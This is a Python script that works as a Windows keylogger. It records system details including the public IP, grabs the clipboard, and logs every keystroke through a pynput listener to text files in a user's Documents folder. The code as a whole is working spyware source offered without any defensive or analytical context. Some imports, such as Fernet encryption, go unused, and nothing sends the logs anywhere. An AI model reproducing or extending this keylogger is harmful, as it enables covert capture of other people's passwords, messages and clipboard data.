#Libraries & Modules 
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

from requests import get

from multiprocessing import Process, freeze_support

#Variables

log_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard = "clipboard.txt"
filepath = "C:\\Users\\Jimmy\\Documents\\Keylogger"
extend = "\\"

#Get systen information
def computer_information():
    with open(filepath + extend + system_info, "a") as y:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            y.write('Public IP: ' + public_ip + '\n')
        
        except Exception:
            y.write("Couldn't get Public IP Address (most likely max query")

        y.write('CPU: ' + (platform.processor() + '\n'))
        y.write('OS: ' + platform.system() + platform.version() + '\n')
        y.write('Machine: ' + platform.machine() + '\n')
        y.write('Hostname ' + hostname + '\n')
        y.write('Private IP: ' + IPAddr + '\n')

computer_information()

#Get clipboard
def copy_clipboard():
    with open(filepath + extend + clipboard, "a") as y:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            y.write('Clipboard: \n' + data)

        except:
            y.write("Clipboard could be not be copied")

copy_clipboard()

#Keylogger
count = 0
keys = []

#on_press function. 
def on_press(key):
    global keys, count
    #output each key on the list.
    print(key)
    #append keys to each key.
    keys.append(key)
    #increase keycount by 1.
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#write_file function.
def write_file(keys):
    #open file
    with open(filepath + extend + log_info, "a") as y:
        #make .txt file more readable.
        for key in keys:
            #convert key to string and replace quotes with space.
            k = str(key).replace("'", "")
            #create a new line every time the spacebar is pressed.
            if k.find("space") > 0:
                y.write('\n')
                y.close()
                #check value of each key, write key to file and close file.
            elif k.find("Key") == -1:
                y.write(k)
                y.close()

#on_release function.
def on_release(key):
    #if escape is pressed --> stop keylogger
    if key == Key.esc:
        return False

#listener function, define values as functions.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
